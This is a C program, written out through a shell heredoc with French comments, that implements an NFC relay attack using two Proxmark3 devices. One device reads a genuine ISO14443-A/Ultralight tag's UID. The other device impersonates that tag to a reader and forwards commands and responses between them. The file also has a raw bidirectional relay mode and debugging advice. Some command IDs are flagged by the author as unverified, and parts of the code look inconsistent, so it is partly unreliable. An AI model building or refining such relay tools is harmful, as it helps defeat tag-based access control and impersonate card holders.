cat << 'EOF' > full_relay.c
#include <windows.h>
#include <stdio.h>
#include <stdint.h>

//Valider le code 
/*Ouvre un terminal et lance : proxmark3.exe COM9 --flush.
Ensuite, tape une commande hf 14a raw. Regarde dans le dossier client/logs/ (si activé) 
ou utilise un Serial Port Monitor gratuit. Tu verras les octets exacts envoyés. Si tu vois 43 48 au début de chaque paquet, 
le code est sur la bonne voie.*/

/*Si jamais le code reste muet : 
// Commande pour faire clignoter les LEDs (ID souvent 0x0103)
send_pm3_raw(hMole, 0x0103, NULL, 0);
Si les LEDs ne bougent pas, c'est que soit le Baudrate est faux, soit le Preamble est mal interprété par le firmware.

Le sniff_ports est ton meilleur ami. Si après 5 secondes il est vide :
Vitesse (Baudrate) : Change CBR_115200 par CBR_460800 dans open_serial. Les firmwares Iceman/RRG modernes utilisent souvent 460800.
Le Préambule : Tu as mis 0x4843 dans send_pm3_raw (Correct pour envoyer 'CH' vers le PM3) et tu vérifies 0x4348 dans start_relay 
(Correct pour recevoir 'HC' du PM3). Cependant, vérifie dans ton sniffer si tu ne vois pas 50 4d 33 (PM3). 
Certains firmwares utilisent un préambule différent.

Problème de bufferisation Windows
Windows a tendance à garder les octets en mémoire pour optimiser les transferts. 
Si rien ne s'affiche, force la lecture en ajoutant ceci dans open_serial :
PurgeComm(hSerial, PURGE_RXCLEAR | PURGE_TXCLEAR | PURGE_RXABORT | PURGE_TXABORT);

Les IDs que tu as définis sont "probables" mais pas universels.
Si get_uid_from_mole échoue : C'est que PM3_CMD_HF_ISO14443A_READER_RAW (0x0385) n'est pas le bon ID pour ton firmware.
Solution : Ouvre ton client Proxmark officiel, tape hf 14a raw 26, et regarde dans le log quel ID de commande est envoyé au matériel.

Voici où la donnée peut se perdre :
PC -> Proxy : Le port COM est-il ouvert par un autre processus (ex: un client PM3 oublié) ?
Proxy -> PC : Le firmware n'envoie rien si l'antenne n'est pas active ou si aucune trame n'est reçue du lecteur.
Mole -> Tag : Si get_uid_from_mole ne renvoie rien, vérifie que le tag est bien positionné.
*/




#define PROXY_PORT "COM9"
#define MOLE_PORT  "\\\\.\\COM10"

// Codes de commande PM3
//A verifier parce que peut etre pas bons
#define PM3_CMD_HF_ISO14443A_READER_RAW  0x0385
#define PM3_CMD_HF_ISO14443A_SIM_RAW     0x0386
#define PM3_CMD_HF_14A_SIM_SET_UID 0x0380

#pragma pack(push, 1)
typedef struct {
    uint32_t magic;    // 'PM3a' = 0x61334d50
    uint16_t len_ng;   // Contient la longueur sur 15 bits + le bit NG
    uint16_t cmd;
    uint8_t  data[512];
} PM3PacketNG;
#pragma pack(pop)


void hex_dump(const char* desc, void* addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char* pc = (unsigned char*)addr;
    if (desc != NULL) printf("%s:\n", desc);
    for (i = 0; i < len; i++) {
        if ((i % 16) == 0) {
            if (i != 0) printf("  %s\n", buff);
            printf("  %04x ", i);
        }
        printf(" %02x", pc[i]);
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) buff[i % 16] = '.';
        else buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }
    while ((i % 16) != 0) { printf("   "); i++; }
    printf("  %s\n", buff);
}

uint16_t update_crc(uint8_t ch, uint16_t *lpw_crc) {
    ch = (ch ^ (uint8_t)((*lpw_crc) & 0x00FF));
    ch = (ch ^ (ch << 4));
    *lpw_crc = (*lpw_crc >> 8) ^ ((uint16_t)ch << 8) ^ ((uint16_t)ch << 3) ^ ((uint16_t)ch >> 4);
    return *lpw_crc;
}

void compute_crc_a(uint8_t *data, int len, uint8_t *crc_out) {
    uint16_t w_crc = 0x6363; // Valeur initiale ISO14443-A
    for (int i = 0; i < len; i++) {
        update_crc(data[i], &w_crc);
    }
    crc_out[0] = (uint8_t)(w_crc & 0xFF);
    crc_out[1] = (uint8_t)((w_crc >> 8) & 0xFF);
}

// Fonction pour configurer le port COM
HANDLE open_serial(const char* portName) {
    HANDLE hSerial = CreateFile(portName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hSerial == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;

    


    DCB dcb = {0};
    dcb.DCBlength = sizeof(dcb);
    GetCommState(hSerial, &dcb);
    //dcb.fDtrControl = DTR_CONTROL_DISABLE;
    //dcb.fRtsControl = RTS_CONTROL_DISABLE;
    dcb.fDtrControl = DTR_CONTROL_ENABLE; // Indispensable pour réveiller le MCU
    dcb.fRtsControl = RTS_CONTROL_ENABLE;
    dcb.fOutX = FALSE;
    dcb.fInX = FALSE;
    dcb.BaudRate = 460800; //Si le sniffer reste vide, essaie de changer CBR_115200 par CBR_460800
    dcb.ByteSize = 8;
    dcb.StopBits = ONESTOPBIT;
    dcb.Parity   = NOPARITY;
    SetCommState(hSerial, &dcb);

    COMMTIMEOUTS timeouts = {0};
    timeouts.ReadIntervalTimeout = 1;
    timeouts.ReadTotalTimeoutConstant = 1;
    timeouts.ReadTotalTimeoutMultiplier = 1;
    SetCommTimeouts(hSerial, &timeouts);
    PurgeComm(hSerial, PURGE_RXCLEAR | PURGE_TXCLEAR | PURGE_RXABORT | PURGE_TXABORT);
    return hSerial;
}

// Extraction de l'UID (7 octets pour Ultralight)
void setup_proxy_with_real_uid(HANDLE hProxy, uint8_t* uid) {
    printf("[*] Configuration du Proxy avec l'UID du tag...\n");
    // On envoie l'UID au simulateur
    send_pm3_raw(hProxy, PM3_CMD_HF_14A_SIM_SET_UID, uid, 7);
}

// Fonction pour extraire l'UID du vrai tag via le Mole
int get_uid_from_mole(HANDLE hMole, uint8_t* out_uid) {
    uint8_t buffer[1024];
    DWORD bytes;
    PM3PacketNG* pkt = (PM3PacketNG*)buffer;

    printf("[*] Demarrage de la sequence d'anticollision sur le MOLE...\n");

    // 1. REQA (0x26) pour reveiller le tag
    uint8_t reqa = 0x26;
    send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, &reqa, 1);
    Sleep(50);
    if (!(ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL) && bytes >= 6)) return 0;

    // 2. ANTICOLLISION Cascade Level 1 (0x93 0x20)
    uint8_t cl1[] = {0x93, 0x20};
    send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, cl1, 2);
    Sleep(50);
    if (!(ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL) && bytes >= 6)) return 0;
    
    // Pour un UID de 7 octets, les 3 premiers octets de l'UID sont ici (après le CT 0x88)
    // Format attendu en CL1: [0x88] [UID0] [UID1] [UID2] [BCC]
    if (pkt->data[0] != 0x88) {
        printf("[!] Tag 4-byte detecte, adaptation...\n");
        memcpy(out_uid, pkt->data, 4); // Cas rare d'un UL 4-byte (très vieux)
        return 1;
    }
    memcpy(out_uid, &pkt->data[1], 3);

    // 3. SELECT Cascade Level 1 (0x93 0x70 + 5 octets reçus)
    uint8_t sel1[7] = {0x93, 0x70};
    memcpy(&sel1[2], pkt->data, 5);
    send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, sel1, 7);
    Sleep(50);
    ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL); // On purge le SAK

    // 4. ANTICOLLISION Cascade Level 2 (0x95 0x20)
    uint8_t cl2[] = {0x95, 0x20};
    send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, cl2, 2);
    Sleep(50);
    if (!(ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL) && bytes >= 6)) return 0;

    // Format attendu en CL2: [UID3] [UID4] [UID5] [UID6] [BCC]
    memcpy(&out_uid[3], pkt->data, 4);

    return 1; // UID de 7 octets complet dans out_uid


    /*Point d'attention : Lors du get_uid_from_mole, le SAK (Select Acknowledge) est crucial. 
    Pour un Ultralight, le SAK final doit être 0x00.
    Si le relai affiche un SAK de 0x04, le lecteur va croire que c'est un tag qui supporte l'ISO-DEP 
    (comme une carte bancaire) et le code libnfc va essayer d'envoyer des commandes RATS au lieu de READ.
    Vérifiee la sortie du sniffer : si on vois passer 0x04 après le SELECT CL2, 
    il faudra peut-être forcer le SAK à 0x00 dans l'initialisation de simulation*/
}


void sniff_ports(HANDLE hProxy, HANDLE hMole) {
    printf("\n[*] MODE SNIFFER ACTIF (5s)... Approchez un tag ou lancez une commande.\n");
    uint8_t buf[1024];
    DWORD bytes;
    DWORD start = GetTickCount();

    while (GetTickCount() - start < 5000) {
        if (ReadFile(hProxy, buf, sizeof(buf), &bytes, NULL) && bytes > 0) {
            hex_dump("SNIFF PROXY", buf, bytes);
        }
        if (ReadFile(hMole, buf, sizeof(buf), &bytes, NULL) && bytes > 0) {
            hex_dump("SNIFF MOLE", buf, bytes);
        }
        Sleep(10);
    }
    printf("[*] Fin du sniffing.\n\n");
}

// Fonction d'envoi robuste
void send_pm3_raw(HANDLE h, uint16_t cmd, uint8_t* data, uint16_t len) {
    uint8_t buffer[600] = {0};
    PM3PacketNG* pkt = (PM3PacketNG*)buffer;

    pkt->magic = 0x61334d50; // "PM3a"
    // On met le bit de poids fort (NG) à 1 et la longueur sur les 15 autres bits
    pkt->len_ng = len | 0x8000; 
    pkt->cmd = cmd;
    
    if (len > 0 && data != NULL) {
        memcpy(pkt->data, data, len);
    }

    // Le placeholder CRC 'a3' doit être APRES les datas
    uint16_t magic_crc = 0xe3a3; 
    memcpy(&buffer[8 + len], &magic_crc, 2);

    DWORD written;
    if (!WriteFile(h, buffer, 8 + len + 2, &written, NULL)) {
        printf("[!] Erreur WriteFile: %lu\n", GetLastError());
    }
    // Force Windows à vider le buffer vers le matériel
    FlushFileBuffers(h);
}


// --- MODE HARDCORE DEBUG : RELAI BRUT ---
void hardcore_debug_relay(HANDLE hProxy, HANDLE hMole) {
    uint8_t buf[2048];
    DWORD bytes;

    printf("\n[!!!] MODE DEBUG HARDCORE ACTIF [!!!]\n");
    printf("[*] Tout ce qui passe par COM9 sera envoye sur COM10 et vice versa.\n");
    printf("[*] Appuyez sur Ctrl+C pour arreter.\n\n");

    while (1) {
        // Sens : LECTEUR (Proxy) -> TAG (Mole)
        if (ReadFile(hProxy, buf, sizeof(buf), &bytes, NULL) && bytes > 0) {
            hex_dump("PROXY >> MOLE", buf, bytes);
            DWORD written;
            WriteFile(hMole, buf, bytes, &written, NULL);
        }

        // Sens : TAG (Mole) -> LECTEUR (Proxy)
        if (ReadFile(hMole, buf, sizeof(buf), &bytes, NULL) && bytes > 0) {
            hex_dump("MOLE >> PROXY", buf, bytes);
            DWORD written;
            WriteFile(hProxy, buf, bytes, &written, NULL);
        }
        
        // On ne met pas de Sleep(1) ici pour une reactivite maximale, 
        // ou alors un tres court.
    }
}

// Fonction de relai principale
void start_relay(HANDLE hProxy, HANDLE hMole) {
    uint8_t buffer[1024];
    DWORD bytesRead;

    printf("[*] Relai actif. En attente du lecteur...\n");

    while (1) {
        // 1. Lire depuis le PROXY (Lecteur -> PC)
        if (ReadFile(hProxy, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 6) {
            PM3PacketNG* pkt = (PM3PacketNG*)buffer;
            
            // On vérifie si c'est une trame reçue du lecteur
            if (pkt->magic == 0x61334d50) { //si on sniff des trucs mais que ca démarre pas, remplacer le if par : 
                //if (memcmp(buffer, "CH", 2) == 0 || memcmp(buffer, "HC", 2) == 0)
                printf("[LECTEUR] Commande: %02X (len %d)\n", pkt->data[0], pkt->len_ng & 0x7FFF);
                
                // 2. Relayer vers le MOLE (PC -> Tag)
                // On utilise la commande 'hf 14a raw' sur le Mole
                send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, pkt->data, pkt->len_ng & 0x7FFF);

                // On boucle un peu car ReadFile peut être trop rapide
                int retry = 0;
                while (retry < 10) {
                    if (ReadFile(hMole, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 6) {
                        PM3PacketNG* resp = (PM3PacketNG*)buffer;
                        printf("[TAG] Réponse recue, renvoi au Proxy\n");
                        
                        // Si la réponse est une lecture de page (16 octets) ou une signature (32 octets)
                        // Le Proxmark en mode raw retire souvent le CRC, on doit le remettre pour le lecteur.
                        //PARTIE AJOUT DE CRC SI BESOIN
                        // if (resp->length == 16 || resp->length == 32 || resp->length == 8) {
                        //     printf("    [CRC] Calcul et ajout du CRC-A...\n");
                        //     compute_crc_a(resp->data, resp->length, &resp->data[resp->length]);
                        //     resp->length += 2; 
                        // }

                        // Renvoi au lecteur via le Proxy
                        send_pm3_raw(hProxy, PM3_CMD_HF_ISO14443A_READER_RAW, resp->data, resp->len_ng & 0x7FFF);
                        break;
                    }
                    Sleep(5); //Si on voit que ca répond pas, tester en mettant sleep(1) ou en le supprimant (délais)
                    retry++;
                }
            }
        }
        Sleep(1);
    }
}

int main() {
    printf("=== RELAI PM3 ULTRALIGHT EXPERT ===\n");


    HANDLE hProxy = open_serial(PROXY_PORT);
    if (hProxy == INVALID_HANDLE_VALUE) {
        printf("[!] Erreur : Impossible d'ouvrir le port PROXY (%s). Code erreur: %lu\n", PROXY_PORT, GetLastError());
        return 1;
    }

    HANDLE hMole = open_serial(MOLE_PORT);
    if (hMole == INVALID_HANDLE_VALUE) {
        printf("[!] Erreur : Impossible d'ouvrir le port MOLE (%s). Code erreur: %lu\n", MOLE_PORT, GetLastError());
        CloseHandle(hProxy); // On ferme le premier s'il était ouvert
        return 1;
    }

    printf("[+] Ports ouverts avec succès : PROXY (%s) et MOLE (%s)\n", PROXY_PORT, MOLE_PORT);

    // 1. Sniffer pour vérifier les IDs de commande
    sniff_ports(hProxy, hMole);
    printf("[*] Sniffer terminé. Vérifiez les IDs de commande et ajustez le code si nécessaire.\n");
    send_pm3_raw(hMole, 0x0103, NULL, 0);


    printf("[*] Tentative de clignotement LED (CMD 0x0103)...\n");
    // On envoie la commande plusieurs fois pour être sûr
    for(int i=0; i<3; i++) {
        send_pm3_raw(hMole, 0x0103, NULL, 0);
        Sleep(100);
    }

        printf("[*] Tentative de clignotement LED (CMD 0x0101)...\n");
    // On envoie la commande plusieurs fois pour être sûr
    for(int i=0; i<3; i++) {
        send_pm3_raw(hMole, 0x0101, NULL, 0);
        Sleep(100);
    }

    // --- INITIALISATION DES PM3 ---
    // On met le Mole en mode Reader
    printf("[*] Init Mole...\n");
    uint8_t init_reader[] = {0x01}; // Active l'antenne
    send_pm3_raw(hMole, 0x0380, init_reader, 1); 

    // 1. Récupération de l'UID réel sur le Mole
    uint8_t real_uid[7] = {0};
    if (get_uid_from_mole(hMole, real_uid)) {
        printf("[+] UID détecté : %02X%02X%02X%02X%02X%02X%02X\n", 
               real_uid[0], real_uid[1], real_uid[2], real_uid[3], 
               real_uid[4], real_uid[5], real_uid[6]);
    } else {
        printf("[!] Échec lecture UID. Utilisation d'un UID par défaut.\n");
        uint8_t default_uid[] = {0x04, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE};
        memcpy(real_uid, default_uid, 7);
    }

    // On met le Proxy en mode Simulation (UID 7 octets bidon pour commencer)
    // Le but ici est que le Proxy accepte les commandes USB pendant la sim
    printf("[*] Init Proxy (Simulation)...\n");
    setup_proxy_with_real_uid(hProxy, real_uid);


    
    //uint8_t sim_setup[] = {0x07, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}; 
    //send_pm3_raw(hProxy, PM3_CMD_HF_ISO14443A_SIM_RAW, sim_setup, 8);

    start_relay(hProxy, hMole);

    //Si jamais ca bug, fct de relai hardcore pour tout envoyer brut sans interprétation
    //hardcore_debug_relay(hProxy, hMole);

    CloseHandle(hProxy);
    CloseHandle(hMole);
    return 0;
}
EOF